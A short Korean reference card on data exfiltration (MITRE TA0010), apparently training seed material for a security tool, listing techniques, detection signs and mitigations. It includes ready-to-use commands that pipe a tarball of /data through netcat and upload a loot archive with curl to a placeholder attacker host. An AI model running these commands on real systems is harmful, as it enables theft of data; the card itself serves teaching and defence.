# 학습 시드(심화): exfiltration

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn exfiltration`. P1: 머신별 라이트업 미참조.

## 개요
데이터 반출(TA0010): 수집 데이터 외부 전송.

## 핵심 기법 · 열거
- C2 채널·DNS/ICMP 터널·클라우드 업로드·압축/암호화 은닉

## 표준 도구 · 명령
```
# 수신: nc -lvnp 4444 > loot.tar.gz
tar czf - /data | nc <lhost> 4444
curl -F f=@loot.zip http://<lhost>/up
```

## 블루팀 탐지
비정상 대용량 아웃바운드·DNS 질의 급증·비승인 클라우드 업로드.

## 완화
DLP·egress 필터·아웃바운드 허용목록·비정상 전송 탐지.

- 출처(검증): https://attack.mitre.org/tactics/TA0010/
